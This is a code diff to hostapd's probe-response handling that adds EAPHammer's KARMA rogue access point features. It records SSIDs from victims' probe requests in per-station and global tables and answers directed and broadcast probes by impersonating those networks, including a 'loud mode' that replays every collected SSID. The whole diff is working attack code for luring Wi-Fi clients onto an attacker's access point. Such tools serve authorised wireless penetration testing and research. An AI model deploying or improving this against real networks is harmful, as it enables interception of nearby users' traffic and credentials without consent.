@@ -33,8 +33,23 @@
 #include "taxonomy.h"
 #include "ieee802_11_auth.h"
 
+
 #ifdef EAPHAMMER
 #include "eaphammer_wpe/eaphammer_wpe.h"
+#include "eh_sta_t.h"
+#include "eh_ssid_t.h"
+#include "eh_ssid_table_t.h"
+#include "eh_ssid_iter_t.h"
+#include "eh_sta_table_t.h"
+#include "eaphammer_wpe/eh_msg_dbg.h"
+#endif
+
+#ifdef EAPHAMMER
+
+// declare and initialize lookup tables
+eh_ssid_table_t *ssid_table = NULL;
+eh_sta_table_t *sta_table = NULL;
+
 #endif
 
 
@@ -369,7 +384,12 @@ static u8 * hostapd_eid_supported_op_classes(struct hostapd_data *hapd, u8 *eid)
 }
 
 
+
+
 static u8 * hostapd_gen_probe_resp(struct hostapd_data *hapd,
+#ifdef EAPHAMMER
+				   const u8 *ssid, size_t ssid_len,
+#endif
 				   const struct ieee80211_mgmt *req,
 				   int is_p2p, size_t *resp_len)
 {
@@ -434,12 +454,14 @@ static u8 * hostapd_gen_probe_resp(struct hostapd_data *hapd,
 	*pos++ = WLAN_EID_SSID;
 #ifdef EAPHAMMER
 	// begin karma
-	if (eaphammer_global_conf.use_karma) {
+	if (eaphammer_global_conf.use_karma && ssid_len  > 0) {
 
-		*pos++ = hapd->karma_info.ssid_len;
-		os_memcpy(pos, hapd->karma_info.ssid, hapd->karma_info.ssid_len);
-		pos += hapd->karma_info.ssid_len;
-	} else {
+		*pos++ = ssid_len;
+		os_memcpy(pos, ssid, ssid_len);
+		pos += ssid_len;
+
+	} 
+	else {
 
 		*pos++ = hapd->conf->ssid.ssid_len;
 		os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
@@ -604,14 +626,6 @@ static enum ssid_match_result ssid_match(struct hostapd_data *hapd,
 	const u8 *pos, *end;
 	int wildcard = 0;
 
-#ifdef EAPHAMMER
-	// begin karma
-	if (eaphammer_global_conf.use_karma) {
-		return EXACT_SSID_MATCH;
-	}
-	// end karma
-#endif
-
 	if (ssid_len == 0)
 		wildcard = 1;
 	if (ssid_len == hapd->conf->ssid.ssid_len &&
@@ -665,8 +679,11 @@ void sta_track_expire(struct hostapd_iface *iface, int force)
 }
 
 
-static struct hostapd_sta_info * sta_track_get(struct hostapd_iface *iface,
-					       const u8 *addr)
+#ifdef EAPHAMMER
+struct hostapd_sta_info * sta_track_get(struct hostapd_iface *iface, const u8 *addr)
+#else
+static struct hostapd_sta_info * sta_track_get(struct hostapd_iface *iface, const u8 *addr)
+#endif
 {
 	struct hostapd_sta_info *info;
 
@@ -754,6 +771,51 @@ void sta_track_claim_taxonomy_info(struct hostapd_iface *iface, const u8 *addr,
 }
 #endif /* CONFIG_TAXONOMY */
 
+#ifdef EAPHAMMER
+int probe_response_helper(struct hostapd_data *hapd,
+							const struct ieee80211_mgmt *mgmt,
+							struct ieee802_11_elems elems,
+							u8 *resp,
+							size_t resp_len,
+							enum ssid_match_result res) {
+
+	int noack;
+	u16 csa_offs[2];
+	size_t csa_offs_len;
+	int ret;
+
+
+	/*
+	 * If this is a broadcast probe request, apply no ack policy to avoid
+	 * excessive retries.
+	 */
+	noack = !!(res == WILDCARD_SSID_MATCH &&
+		   is_broadcast_ether_addr(mgmt->da));
+	
+	csa_offs_len = 0;
+	if (hapd->csa_in_progress) {
+	
+		if (hapd->cs_c_off_proberesp) {
+			csa_offs[csa_offs_len++] = hapd->cs_c_off_proberesp;
+		}
+		if (hapd->cs_c_off_ecsa_proberesp) {
+			csa_offs[csa_offs_len++] = hapd->cs_c_off_ecsa_proberesp;
+		}
+	}
+	
+	ret = hostapd_drv_send_mlme_csa(hapd, resp, resp_len, noack,
+					csa_offs_len ? csa_offs : NULL,
+					csa_offs_len);
+	
+	if (ret < 0) {
+		wpa_printf(MSG_INFO, "handle_probe_req: send failed");
+	}
+	os_free(resp);
+	
+	return 0;
+}
+#endif
+
 
 void handle_probe_req(struct hostapd_data *hapd,
 		      const struct ieee80211_mgmt *mgmt, size_t len,
@@ -764,16 +826,27 @@ void handle_probe_req(struct hostapd_data *hapd,
 	const u8 *ie;
 	size_t ie_len;
 	size_t i, resp_len;
+#ifndef EAPHAMMER
 	int noack;
+#endif
 	enum ssid_match_result res;
 	int ret;
+#ifndef EAPHAMMER
 	u16 csa_offs[2];
 	size_t csa_offs_len;
+#endif
 	u32 session_timeout, acct_interim_interval;
 	struct vlan_description vlan_id;
 	struct hostapd_sta_wpa_psk_short *psk = NULL;
 	char *identity = NULL;
 	char *radius_cui = NULL;
+
+#ifdef EAPHAMMER
+	int is_broadcast_probe = 0; 
+	eh_ssid_t *next_ssid;
+	eh_sta_t *next_sta;
+	eh_ssid_iter_t *iterator;
+#endif
 
 	if (len < IEEE80211_HDRLEN)
 		return;
@@ -825,23 +898,6 @@ void handle_probe_req(struct hostapd_data *hapd,
 	 * is less likely to see them (Probe Request frame sent on a
 	 * neighboring, but partially overlapping, channel).
 	 */
-#ifdef EAPHAMMER
-	// begin karma
-	if (!eaphammer_global_conf.use_karma) {
-	
-		if (elems.ds_params &&
-		    hapd->iface->current_mode &&
-		    (hapd->iface->current_mode->mode == HOSTAPD_MODE_IEEE80211G ||
-		     hapd->iface->current_mode->mode == HOSTAPD_MODE_IEEE80211B) &&
-		    hapd->iconf->channel != elems.ds_params[0]) {
-			wpa_printf(MSG_DEBUG,
-				   "Ignore Probe Request due to DS Params mismatch: chan=%u != ds.chan=%u",
-				   hapd->iconf->channel, elems.ds_params[0]);
-			return;
-		}
-	}
-	// end karma
-#else
 	if (elems.ds_params &&
 	    hapd->iface->current_mode &&
 	    (hapd->iface->current_mode->mode == HOSTAPD_MODE_IEEE80211G ||
@@ -852,7 +908,6 @@ void handle_probe_req(struct hostapd_data *hapd,
 			   hapd->iconf->channel, elems.ds_params[0]);
 		return;
 	}
-#endif
 
 #ifdef CONFIG_P2P
 	if (hapd->p2p && hapd->p2p_group && elems.wps_ie) {
@@ -915,6 +970,73 @@ void handle_probe_req(struct hostapd_data *hapd,
 
 	res = ssid_match(hapd, elems.ssid, elems.ssid_len,
 			 elems.ssid_list, elems.ssid_list_len);
+
+#ifdef EAPHAMMER
+
+	if (!eaphammer_global_conf.use_karma) {
+		if (res == NO_SSID_MATCH) {
+			if (!(mgmt->da[0] & 0x01)) {
+				wpa_printf(MSG_MSGDUMP, "Probe Request from " MACSTR
+						   " for foreign SSID '%s' (DA " MACSTR ")%s",
+						   MAC2STR(mgmt->sa),
+						   wpa_ssid_txt(elems.ssid, elems.ssid_len),
+						   MAC2STR(mgmt->da),
+						   elems.ssid_list ? " (SSID list)" : "");
+			}
+			return;
+		}
+	}
+	else { // karma enabled
+
+		switch(res) {
+
+		case WILDCARD_SSID_MATCH:
+
+			eh_msg_dbg_bc_probe_rec(mgmt->sa);
+			is_broadcast_probe = 1; 
+			break;
+		case NO_SSID_MATCH:
+		case EXACT_SSID_MATCH:
+
+			// since we're implementing a karma attack, NO_SSID_MATCH and
+			// EXACT_SSID_MATCH are logically equivalent (directed probe)
+			next_ssid = NULL;
+			next_sta = NULL;
+			is_broadcast_probe = 0; 
+
+			// credit for LOUD MODE goes to Sensepost... this isn't anything new...
+			// they did it first
+			if (eaphammer_global_conf.singed_pants) { 
+				next_ssid = eh_ssid_table_t_find(ssid_table, wpa_ssid_txt(elems.ssid, elems.ssid_len));
+				if (next_ssid == NULL) { // SSID not in hash table yet
+					eh_msg_dbg_add_ssid_from_sta(elems.ssid, elems.ssid_len, mgmt->sa);
+					next_ssid = eh_ssid_t_create(wpa_ssid_txt(elems.ssid, elems.ssid_len),
+												elems.ssid,
+												elems.ssid_len);
+					eh_ssid_table_t_add(ssid_table, next_ssid);
+				}
+			}
+			else {
+				next_sta = eh_sta_table_t_findsert(sta_table, mgmt->sa);
+				next_ssid = eh_sta_t_get_ssid(next_sta, wpa_ssid_txt(elems.ssid, elems.ssid_len));
+				if (next_ssid == NULL) { // SSID not in hash table yet
+					eh_msg_dbg_add_ssid_from_sta(elems.ssid, elems.ssid_len, mgmt->sa);
+					next_ssid = eh_ssid_t_create(wpa_ssid_txt(elems.ssid, elems.ssid_len),
+												elems.ssid,
+												elems.ssid_len);
+					eh_sta_t_add_ssid(next_sta, next_ssid);
+				}
+			}
+			break;
+		default:
+
+			// we should never reach this block of code
+			exit(1);
+		}
+
+	} // end karma enabled
+
+#else
 	if (res == NO_SSID_MATCH) {
 		if (!(mgmt->da[0] & 0x01)) {
 			wpa_printf(MSG_MSGDUMP, "Probe Request from " MACSTR
@@ -926,14 +1048,6 @@ void handle_probe_req(struct hostapd_data *hapd,
 		}
 		return;
 	}
-#ifdef EAPHAMMER
-	// begin karma
-	if (eaphammer_global_conf.use_karma) {
-
-		os_memcpy(hapd->karma_info.ssid, elems.ssid, elems.ssid_len);
-		hapd->karma_info.ssid_len = elems.ssid_len;
-	}
-	// end karma
 #endif
 
 #ifdef CONFIG_INTERWORKING
@@ -1014,13 +1128,76 @@ void handle_probe_req(struct hostapd_data *hapd,
 	}
 #endif /* CONFIG_TESTING_OPTIONS */
 
+#ifdef EAPHAMMER
+
+	if (is_broadcast_probe) {
+
+		// if we're using loud mode, we send a beacon for everything in the global ssid table
+		iterator = eh_ssid_iter_t_create(
+			eaphammer_global_conf.singed_pants ? ssid_table : eh_sta_table_t_get_ssids(
+																	sta_table, mgmt->sa));
+
+		while (iterator != NULL) {
+
+			next_ssid = eh_ssid_iter_t_next(iterator);
+
+			// generate the probe response 
+			eh_msg_dbg_gen_bc_probe_resp(next_ssid->str, next_ssid->len, mgmt->sa);
+			resp = hostapd_gen_probe_resp(hapd,
+									next_ssid->bytes,
+									next_ssid->len,
+									mgmt,
+									elems.p2p != NULL,
+									&resp_len);
+			if (resp == NULL) {
+				return;
+			}
+			probe_response_helper(hapd, mgmt, elems, resp, resp_len, res);
+			eh_msg_dbg_exc_probe_req_rec(mgmt->sa, next_ssid->str);
+		}
+	}
+	else {
+
+		if (eaphammer_global_conf.use_karma) {
+
+			eh_msg_dbg_gen_probe_resp(elems.ssid, elems.ssid_len, mgmt->sa);
+			resp = hostapd_gen_probe_resp(hapd,
+									elems.ssid,
+									elems.ssid_len,
+									mgmt, elems.p2p != NULL,
+									&resp_len);
+
+		}
+		else {
+
+			resp = hostapd_gen_probe_resp(hapd,
+									hapd->conf->ssid.ssid,
+									hapd->conf->ssid.ssid_len,
+									mgmt,
+									elems.p2p != NULL,
+									&resp_len);
+
+		}
+		if (resp == NULL) { // this shouldn't happen
+			return;
+		}
+
+		probe_response_helper(hapd, mgmt, elems, resp, resp_len, res);
+		eh_msg_dbg_exc_probe_req_rec(mgmt->sa, elems.ssid_len==0?"broadcast":"our");
+	}
+
+#else
+
 	wpa_msg_ctrl(hapd->msg_ctx, MSG_INFO, RX_PROBE_REQUEST "sa=" MACSTR
 		     " signal=%d", MAC2STR(mgmt->sa), ssi_signal);
 
 	resp = hostapd_gen_probe_resp(hapd, mgmt, elems.p2p != NULL,
 				      &resp_len);
-	if (resp == NULL)
+
+	if (resp == NULL) {
+
 		return;
+	}
 
 	/*
 	 * If this is a broadcast probe request, apply no ack policy to avoid
@@ -1031,27 +1208,35 @@ void handle_probe_req(struct hostapd_data *hapd,
 
 	csa_offs_len = 0;
 	if (hapd->csa_in_progress) {
-		if (hapd->cs_c_off_proberesp)
-			csa_offs[csa_offs_len++] =
-				hapd->cs_c_off_proberesp;
 
-		if (hapd->cs_c_off_ecsa_proberesp)
-			csa_offs[csa_offs_len++] =
-				hapd->cs_c_off_ecsa_proberesp;
+		if (hapd->cs_c_off_proberesp) {
+
+			csa_offs[csa_offs_len++] = hapd->cs_c_off_proberesp;
+
+		}
+		if (hapd->cs_c_off_ecsa_proberesp) {
+
+			csa_offs[csa_offs_len++] = hapd->cs_c_off_ecsa_proberesp;
+		}
 	}
 
 	ret = hostapd_drv_send_mlme_csa(hapd, resp, resp_len, noack,
 					csa_offs_len ? csa_offs : NULL,
 					csa_offs_len);
 
-	if (ret < 0)
+	if (ret < 0) {
+
 		wpa_printf(MSG_INFO, "handle_probe_req: send failed");
+	}
 
 	os_free(resp);
 
 	wpa_printf(MSG_EXCESSIVE, "STA " MACSTR " sent probe request for %s "
 		   "SSID", MAC2STR(mgmt->sa),
 		   elems.ssid_len == 0 ? "broadcast" : "our");
+
+#endif
+
 }
 
 
@@ -1087,7 +1272,11 @@ static u8 * hostapd_probe_resp_offloads(struct hostapd_data *hapd,
 			   "this");
 
 	/* Generate a Probe Response template for the non-P2P case */
+#ifdef EAPHAMMER
+	return hostapd_gen_probe_resp(hapd, NULL, 0, NULL, 0, resp_len);
+#else
 	return hostapd_gen_probe_resp(hapd, NULL, 0, resp_len);
+#endif
 }
 
 #endif /* NEED_AP_MLME */
@@ -1506,9 +1695,9 @@ int ieee802_11_set_beacons(struct hostapd_iface *iface)
 	int ret = 0;
 
 	for (i = 0; i < iface->num_bss; i++) {
-		if (iface->bss[i]->started &&
-		    ieee802_11_set_beacon(iface->bss[i]) < 0)
+		if (iface->bss[i]->started && ieee802_11_set_beacon(iface->bss[i]) < 0) {
 			ret = -1;
+		}
 	}
 
 	return ret;
@@ -1523,11 +1712,14 @@ int ieee802_11_update_beacons(struct hostapd_iface *iface)
 
 	for (i = 0; i < iface->num_bss; i++) {
 		if (iface->bss[i]->beacon_set_done && iface->bss[i]->started &&
-		    ieee802_11_set_beacon(iface->bss[i]) < 0)
+		    ieee802_11_set_beacon(iface->bss[i]) < 0) {
 			ret = -1;
+		}
 	}
+		
 
 	return ret;
 }
 
 #endif /* CONFIG_NATIVE_WINDOWS */
+
